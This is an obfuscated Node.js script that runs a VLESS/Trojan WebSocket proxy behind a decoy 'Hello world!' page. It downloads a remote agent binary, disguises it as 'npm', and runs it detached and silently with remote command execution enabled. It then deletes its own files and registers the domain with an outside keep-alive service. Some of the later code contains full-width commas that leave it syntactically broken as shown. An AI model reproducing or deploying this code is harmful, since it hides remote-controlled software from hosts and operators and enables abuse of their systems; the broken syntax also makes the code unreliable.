const _0x3d4ca9=_0x50da;(function(_0x293295,_0xbfc48c){const _0xe9c17f=_0x50da,_0x273a51=_0x293295();while(!![]){try{const _0x491e50=-parseInt(_0xe9c17f(0x209))/0x1*(-parseInt(_0xe9c17f(0x20a))/0x2)+parseInt(_0xe9c17f(0x1c8))/0x3*(parseInt(_0xe9c17f(0x23b))/0x4)+parseInt(_0xe9c17f(0x1d8))/0x5+-parseInt(_0xe9c17f(0x1c4))/0x6*(parseInt(_0xe9c17f(0x20f))/0x7)+parseInt(_0xe9c17f(0x21a))/0x8+parseInt(_0xe9c17f(0x1fc))/0x9*(-parseInt(_0xe9c17f(0x1f9))/0xa)+-parseInt(_0xe9c17f(0x232))/0xb;if(_0x491e50===_0xbfc48c)break;else _0x273a51['push'](_0x273a51['shift']());}catch(_0x33f6c3){_0x273a51['push'](_0x273a51['shift']());}}}(_0x24f6,0xd2f84));const os=require('os'),http=require(_0x3d4ca9(0x1c6)),fs=require('fs'),axios=require(_0x3d4ca9(0x1e2)),net=require('net'),path=require(_0x3d4ca9(0x1ca)),crypto=require(_0x3d4ca9(0x212)),{Buffer}=require(_0x3d4ca9(0x1db)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x3d4ca9(0x238)]||_0x3d4ca9(0x203),NEZHA_SERVER=process[_0x3d4ca9(0x217)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x3d4ca9(0x217)][_0x3d4ca9(0x223)]||'',NEZHA_KEY=process[_0x3d4ca9(0x217)][_0x3d4ca9(0x1da)]||'',DOMAIN=process[_0x3d4ca9(0x217)][_0x3d4ca9(0x218)]||_0x3d4ca9(0x200),AUTO_ACCESS=process[_0x3d4ca9(0x217)]['AUTO_ACCESS']||!![],WSPATH=process['env'][_0x3d4ca9(0x1ce)]||UUID[_0x3d4ca9(0x23e)](0x0,0x8),SUB_PATH=process[_0x3d4ca9(0x217)][_0x3d4ca9(0x1f2)]||_0x3d4ca9(0x1e8),NAME=process[_0x3d4ca9(0x217)][_0x3d4ca9(0x1f6)]||'Hug',PORT=process['env'][_0x3d4ca9(0x1f7)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x7d2b40=_0x3d4ca9;try{const _0x5b5b6a=await axios[_0x7d2b40(0x1f1)]('https://speed.cloudflare.com/meta'),_0x495139=_0x5b5b6a[_0x7d2b40(0x1c7)];ISP=(_0x495139[_0x7d2b40(0x1fa)]+'-'+_0x495139[_0x7d2b40(0x210)])['replace'](/ /g,'_');}catch(_0x2ea9de){ISP=_0x7d2b40(0x1d6);}};GetISP();const httpServer=http[_0x3d4ca9(0x1ea)]((_0x4f74f7,_0x36a6e5)=>{const _0x4e38b5=_0x3d4ca9;if(_0x4f74f7[_0x4e38b5(0x226)]==='/'){const _0x599b17=path['join'](__dirname,'index.html');fs[_0x4e38b5(0x1c5)](_0x599b17,_0x4e38b5(0x1ec),(_0x252de2,_0x197571)=>{const _0x20a039=_0x4e38b5;if(_0x252de2){_0x36a6e5[_0x20a039(0x1ff)](0xc8,{'Content-Type':'text/html'}),_0x36a6e5[_0x20a039(0x231)](_0x20a039(0x216));return;}_0x36a6e5[_0x20a039(0x1ff)](0xc8,{'Content-Type':'text/html'}),_0x36a6e5[_0x20a039(0x231)](_0x197571);});return;}else{if(_0x4f74f7[_0x4e38b5(0x226)]==='/'+SUB_PATH){const _0x3a8d23=_0x4e38b5(0x1fe)+UUID+'@'+DOMAIN+_0x4e38b5(0x1e0)+DOMAIN+_0x4e38b5(0x225)+DOMAIN+_0x4e38b5(0x239)+WSPATH+'#'+NAME+'-'+ISP,_0x3d61eb=_0x4e38b5(0x1e6)+UUID+'@'+DOMAIN+_0x4e38b5(0x202)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x4e38b5(0x239)+WSPATH+'#'+NAME+'-'+ISP,_0x537136=_0x3a8d23+'\x0a'+_0x3d61eb,_0x2a7b10=Buffer[_0x4e38b5(0x208)](_0x537136)['toString'](_0x4e38b5(0x237));_0x36a6e5[_0x4e38b5(0x1ff)](0xc8,{'Content-Type':_0x4e38b5(0x21c)}),_0x36a6e5[_0x4e38b5(0x231)](_0x2a7b10+'\x0a');}else _0x36a6e5[_0x4e38b5(0x1ff)](0x194,{'Content-Type':'text/plain'}),_0x36a6e5[_0x4e38b5(0x231)](_0x4e38b5(0x224));}}),wss=new WebSocket[(_0x3d4ca9(0x201))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x3d4ca9(0x1d0)];function resolveHost(_0x30cb7b){return new Promise((_0x45ba8a,_0x5322f2)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x30cb7b)){_0x45ba8a(_0x30cb7b);return;}let _0x2c0c76=0x0;function _0x30e303(){const _0x4a5b7f=_0x50da;if(_0x2c0c76>=DNS_SERVERS[_0x4a5b7f(0x1cd)]){_0x5322f2(new Error(_0x4a5b7f(0x1e3)+_0x30cb7b+_0x4a5b7f(0x22d)));return;}const _0x3b215c=DNS_SERVERS[_0x2c0c76];_0x2c0c76++;const _0x321a1e='https://dns.google/resolve?name='+encodeURIComponent(_0x30cb7b)+_0x4a5b7f(0x1f4);axios[_0x4a5b7f(0x1f1)](_0x321a1e,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})['then'](_0xaf5acd=>{const _0x628c04=_0x4a5b7f,_0x200272=_0xaf5acd[_0x628c04(0x1c7)];if(_0x200272[_0x628c04(0x1ee)]===0x0&&_0x200272[_0x628c04(0x233)]&&_0x200272[_0x628c04(0x233)]['length']>0x0){const _0x72fcad=_0x200272[_0x628c04(0x233)][_0x628c04(0x214)](_0x48b0a5=>_0x48b0a5['type']===0x1);if(_0x72fcad){_0x45ba8a(_0x72fcad['data']);return;}}_0x30e303();})[_0x4a5b7f(0x221)](_0x2b5422=>{_0x30e303();});}_0x30e303();});}function handleVlessConnection(_0x325d54,_0x2d9aa6){const _0x1f1194=_0x3d4ca9,[_0x43fc6a]=_0x2d9aa6,_0x592adc=_0x2d9aa6[_0x1f1194(0x23e)](0x1,0x11);if(!_0x592adc[_0x1f1194(0x1d3)]((_0x1b95de,_0x11567c)=>_0x1b95de==parseInt(uuid[_0x1f1194(0x22c)](_0x11567c*0x2,0x2),0x10)))return![];let _0x79acbe=_0x2d9aa6['slice'](0x11,0x12)[_0x1f1194(0x1ef)]()+0x13;const _0x5bcce0=_0x2d9aa6[_0x1f1194(0x23e)](_0x79acbe,_0x79acbe+=0x2)['readUInt16BE'](0x0),_0x171bb5=_0x2d9aa6[_0x1f1194(0x23e)](_0x79acbe,_0x79acbe+=0x1)['readUInt8'](),_0x3ac71d=_0x171bb5==0x1?_0x2d9aa6[_0x1f1194(0x23e)](_0x79acbe,_0x79acbe+=0x4)[_0x1f1194(0x1fb)]('.'):_0x171bb5==0x2?new TextDecoder()[_0x1f1194(0x21e)](_0x2d9aa6['slice'](_0x79acbe+0x1,_0x79acbe+=0x1+_0x2d9aa6[_0x1f1194(0x23e)](_0x79acbe,_0x79acbe+0x1)[_0x1f1194(0x1ef)]())):_0x171bb5==0x3?_0x2d9aa6[_0x1f1194(0x23e)](_0x79acbe,_0x79acbe+=0x10)['reduce']((_0x16b15c,_0x16aedf,_0x4cb89e,_0x2a5dbf)=>_0x4cb89e%0x2?_0x16b15c[_0x1f1194(0x235)](_0x2a5dbf['slice'](_0x4cb89e-0x1,_0x4cb89e+0x1)):_0x16b15c,[])['map'](_0x2927ba=>_0x2927ba[_0x1f1194(0x1fd)](0x0)[_0x1f1194(0x236)](0x10))[_0x1f1194(0x1fb)](':'):'';_0x325d54[_0x1f1194(0x1d5)](new Uint8Array([_0x43fc6a,0x0]));const _0x54d6df=createWebSocketStream(_0x325d54);return resolveHost(_0x3ac71d)[_0x1f1194(0x228)](_0x230b4d=>{const _0x55b267=_0x1f1194;net[_0x55b267(0x22f)]({'host':_0x230b4d,'port':_0x5bcce0},function(){const _0x447293=_0x55b267;this[_0x447293(0x21d)](_0x2d9aa6[_0x447293(0x23e)](_0x79acbe)),_0x54d6df['on']('error',()=>{})[_0x447293(0x234)](this)['on']('error',()=>{})[_0x447293(0x234)](_0x54d6df);})['on'](_0x55b267(0x229),()=>{});})[_0x1f1194(0x221)](_0x4fb9b5=>{const _0x2d8b04=_0x1f1194;net[_0x2d8b04(0x22f)]({'host':_0x3ac71d,'port':_0x5bcce0},function(){const _0x622525=_0x2d8b04;this[_0x622525(0x21d)](_0x2d9aa6[_0x622525(0x23e)](_0x79acbe)),_0x54d6df['on'](_0x622525(0x229),()=>{})[_0x622525(0x234)](this)['on']('error',()=>{})[_0x622525(0x234)](_0x54d6df);})['on'](_0x2d8b04(0x229),()=>{});}),!![];}function _0x24f6(){const _0x16a926=['close','Status','readUInt8','trim','get','SUB_PATH','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','&type=A','post','NAME','PORT','https://arm64.ssss.nyc.mn/agent','104450WBNhxa','country','join','378uGsysl','readUInt16BE','vless://','writeHead','1234.abc.com','Server',':443?security=tls&sni=','7b6aa69e-414d-474e-ad0e-b8bfe69059ca','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','443','unlink','map','from','7486QIiatt','154UXPdpr','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','message','application/json','https://amd64.ssss.nyc.mn/agent','7CqRcTz','asOrganization','writeFileSync','crypto','finish','find','createWriteStream','Hello\x20world!','env','DOMAIN','https://arm64.ssss.nyc.mn/v1','3887016KyeXqN','log','text/plain','write','decode','npm\x20download\x20successfully','client_secret:\x20','catch','npm','NEZHA_PORT','Not\x20Found\x0a','&fp=chrome&type=ws&host=','url','utf-8','then','error','https://','includes','substr','\x20with\x20all\x20DNS\x20servers','setsid\x20nohup\x20./npm\x20-s\x20','connect','arm','end','7885317dGnvWL','Answer','pipe','concat','toString','base64','UUID','&path=%2F','8443','8yVNkkU','reduce','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','slice','--tls','2126814unLMNN','readFile','http','data','177153JTAqHs','config.yaml','path','2053','https://amd64.ssss.nyc.mn/v1','length','WSPATH','true','1.1.1.1','/bin/bash','npm\x20running\x20error:','every','error:\x20','send','Unknown','\x20-p\x20','5968685wGmdEL','Server\x20is\x20running\x20on\x20port\x20','NEZHA_KEY','buffer','sha224','hex','connection','split',':443?encryption=none&security=tls&sni=','stream','axios','Failed\x20to\x20resolve\x20','createHash','false','trojan://','https://oooo.serv00.net/add-url','sub','chmod\x20+x\x20npm','createServer','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','utf8'];_0x24f6=function(){return _0x16a926;};return _0x24f6();}function handleTrojanConnection(_0x23ce27,_0x25706b){const _0x56a9c7=_0x3d4ca9;try{if(_0x25706b['length']<0x3a)return![];const _0x27ea45=_0x25706b[_0x56a9c7(0x23e)](0x0,0x38)[_0x56a9c7(0x236)](),_0x2751b7=[UUID];let _0xa5b519=null;for(const _0xe5e3b1 of _0x2751b7){const _0x1c433b=crypto[_0x56a9c7(0x1e4)](_0x56a9c7(0x1dc))['update'](_0xe5e3b1)['digest'](_0x56a9c7(0x1dd));if(_0x1c433b===_0x27ea45){_0xa5b519=_0xe5e3b1;break;}}if(!_0xa5b519)return![];let _0xf3d015=0x38;_0x25706b[_0xf3d015]===0xd&&_0x25706b[_0xf3d015+0x1]===0xa&&(_0xf3d015+=0x2);const _0x3aeef2=_0x25706b[_0xf3d015];if(_0x3aeef2!==0x1)return![];_0xf3d015+=0x1;const _0x5e6800=_0x25706b[_0xf3d015];_0xf3d015+=0x1;let _0x547469,_0x5d51c2;if(_0x5e6800===0x1)_0x547469=_0x25706b[_0x56a9c7(0x23e)](_0xf3d015,_0xf3d015+0x4)[_0x56a9c7(0x1fb)]('.'),_0xf3d015+=0x4;else{if(_0x5e6800===0x3){const _0x16c94f=_0x25706b[_0xf3d015];_0xf3d015+=0x1,_0x547469=_0x25706b['slice'](_0xf3d015,_0xf3d015+_0x16c94f)[_0x56a9c7(0x236)](),_0xf3d015+=_0x16c94f;}else{if(_0x5e6800===0x4)_0x547469=_0x25706b[_0x56a9c7(0x23e)](_0xf3d015,_0xf3d015+0x10)[_0x56a9c7(0x23c)]((_0x2f99d5,_0x48bc99,_0x43e535,_0x51d1a9)=>_0x43e535%0x2?_0x2f99d5[_0x56a9c7(0x235)](_0x51d1a9[_0x56a9c7(0x23e)](_0x43e535-0x1,_0x43e535+0x1)):_0x2f99d5,[])[_0x56a9c7(0x207)](_0x2557fd=>_0x2557fd[_0x56a9c7(0x1fd)](0x0)[_0x56a9c7(0x236)](0x10))[_0x56a9c7(0x1fb)](':'),_0xf3d015+=0x10;else return![];}}_0x5d51c2=_0x25706b[_0x56a9c7(0x1fd)](_0xf3d015),_0xf3d015+=0x2;_0xf3d015<_0x25706b['length']&&_0x25706b[_0xf3d015]===0xd&&_0x25706b[_0xf3d015+0x1]===0xa&&(_0xf3d015+=0x2);const _0x34d4e8=createWebSocketStream(_0x23ce27);return resolveHost(_0x547469)['then'](_0x2b5ab3=>{const _0x336e64=_0x56a9c7;net[_0x336e64(0x22f)]({'host':_0x2b5ab3,'port':_0x5d51c2},function(){const _0x337ff0=_0x336e64;_0xf3d015<_0x25706b[_0x337ff0(0x1cd)]&&this[_0x337ff0(0x21d)](_0x25706b[_0x337ff0(0x23e)](_0xf3d015)),_0x34d4e8['on'](_0x337ff0(0x229),()=>{})['pipe'](this)['on'](_0x337ff0(0x229),()=>{})['pipe'](_0x34d4e8);})['on'](_0x336e64(0x229),()=>{});})[_0x56a9c7(0x221)](_0x341e09=>{const _0xe65b1c=_0x56a9c7;net['connect']({'host':_0x547469,'port':_0x5d51c2},function(){const _0x5cdbea=_0x50da;_0xf3d015<_0x25706b['length']&&this['write'](_0x25706b[_0x5cdbea(0x23e)](_0xf3d015)),_0x34d4e8['on'](_0x5cdbea(0x229),()=>{})[_0x5cdbea(0x234)](this)['on'](_0x5cdbea(0x229),()=>{})[_0x5cdbea(0x234)](_0x34d4e8);})['on'](_0xe65b1c(0x229),()=>{});}),!![];}catch(_0x4d98d7){return![];}}wss['on'](_0x3d4ca9(0x1de),(_0x323a02,_0xec525c)=>{const _0xc064cd=_0x3d4ca9,_0x89affb=_0xec525c[_0xc064cd(0x226)]||'';_0x323a02['once'](_0xc064cd(0x20c),_0x3a5cd6=>{const _0x3af56c=_0xc064cd;if(_0x3a5cd6[_0x3af56c(0x1cd)]>0x11&&_0x3a5cd6[0x0]===0x0){const _0x283e5d=_0x3a5cd6['slice'](0x1,0x11),_0x2d797c=_0x283e5d[_0x3af56c(0x1d3)]((_0x853399,_0x15fd2c)=>_0x853399==parseInt(uuid[_0x3af56c(0x22c)](_0x15fd2c*0x2,0x2),0x10));if(_0x2d797c){!handleVlessConnection(_0x323a02,_0x3a5cd6)&&_0x323a02[_0x3af56c(0x1ed)]();return;}}!handleTrojanConnection(_0x323a02,_0x3a5cd6)&&_0x323a02['close']();})['on'](_0xc064cd(0x229),()=>{});});function _0x50da(_0x4c1618,_0x137dde){_0x4c1618=_0x4c1618-0x1c4;const _0x24f6e8=_0x24f6();let _0x50dab0=_0x24f6e8[_0x4c1618];return _0x50dab0;}const getDownloadUrl=()=>{const _0x463fb1=_0x3d4ca9,_0x4265a6=os['arch']();return _0x4265a6===_0x463fb1(0x230)||_0x4265a6==='arm64'||_0x4265a6==='aarch64'?!NEZHA_PORT?_0x463fb1(0x219):_0x463fb1(0x1f8):!NEZHA_PORT?_0x463fb1(0x1cc):_0x463fb1(0x20e);},downloadFile=async()=>{const _0x1819df=_0x3d4ca9;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x2891a2=getDownloadUrl(),_0x34c292=await axios({'method':'get','url':_0x2891a2,'responseType':_0x1819df(0x1e1)}),_0x430e7e=fs[_0x1819df(0x215)]('npm');return _0x34c292[_0x1819df(0x1c7)][_0x1819df(0x234)](_0x430e7e),new Promise((_0x2d39ee,_0x388bd7)=>{const _0x2f14f5=_0x1819df;_0x430e7e['on'](_0x2f14f5(0x213),()=>{const _0x553e72=_0x2f14f5;console[_0x553e72(0x21b)](_0x553e72(0x21f)),exec(_0x553e72(0x1e9),_0xc8ab09=>{if(_0xc8ab09)_0x388bd7(_0xc8ab09);_0x2d39ee();});}),_0x430e7e['on'](_0x2f14f5(0x229),_0x388bd7);});}catch(_0x3cceff){throw _0x3cceff;}},runnz=async()=>{const _0x2b09b3=_0x3d4ca9;try{const _0x14478f=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x2b09b3(0x227)});if(_0x14478f[_0x2b09b3(0x1f0)]()!==''){console[_0x2b09b3(0x21b)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x33284f){}await downloadFile();let _0x405a76='',_0x581ccd=[_0x2b09b3(0x205)，_0x2b09b3(0x23a)，'2096'，'2087'，'2083'，_0x2b09b3(0x1cb)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x59acab=_0x581ccd[_0x2b09b3(0x22b)](NEZHA_PORT)?_0x2b09b3(0x23f):'';_0x405a76=_0x2b09b3(0x22e)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2b09b3(0x1d7)+NEZHA_KEY+'\x20'+_0x59acab+_0x2b09b3(0x1f3);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xe33ae2=NEZHA_SERVER[_0x2b09b3(0x22b)](':')?NEZHA_SERVER[_0x2b09b3(0x1df)](':')['pop']():''，_0x4cd413=_0x581ccd[_0x2b09b3(0x22b)](_0xe33ae2)?_0x2b09b3(0x1cf):_0x2b09b3(0x1e5)，_0x8748ab=_0x2b09b3(0x220)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x2b09b3(0x20b)+_0x4cd413+_0x2b09b3(0x1eb)+UUID;fs[_0x2b09b3(0x211)]('config.yaml'，_0x8748ab);}_0x405a76=_0x2b09b3(0x204);}else{console[_0x2b09b3(0x21b)](_0x2b09b3(0x23d));return;}}try{exec(_0x405a76，{'shell':_0x2b09b3(0x1d1)}，_0x16b3d4=>{const _0x44781e=_0x2b09b3;if(_0x16b3d4)console['error'](_0x44781e(0x1d2)，_0x16b3d4);else console[_0x44781e(0x21b)]('npm\x20is\x20running');});}catch(_0x128e93){console[_0x2b09b3(0x229)](_0x2b09b3(0x1d4)+_0x128e93);}};async function addAccessTask(){const _0x243bd9=_0x3d4ca9;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x314ad4=_0x243bd9(0x22a)+DOMAIN;try{const _0x291143=await axios[_0x243bd9(0x1f5)](_0x243bd9(0x1e7)，{'url':_0x314ad4}，{'headers':{'Content-Type':_0x243bd9(0x20d)}});console['log']('Automatic\x20Access\x20任务\x20added\x20successfully');}catch(_0x29e053){}}const delFiles=()=>{const _0x5c516e=_0x3d4ca9;fs[_0x5c516e(0x206)](_0x5c516e(0x222)，()=>{})，fs['unlink'](_0x5c516e(0x1c9)，()=>{});};httpServer['listen'](PORT，()=>{const _0x5c3deb=_0x3d4ca9;runnz()，setTimeout(()=>{delFiles();},0x2bf20)，addAccessTask(),console[_0x5c3deb(0x21b)](_0x5c3deb(0x1d9)+PORT);});
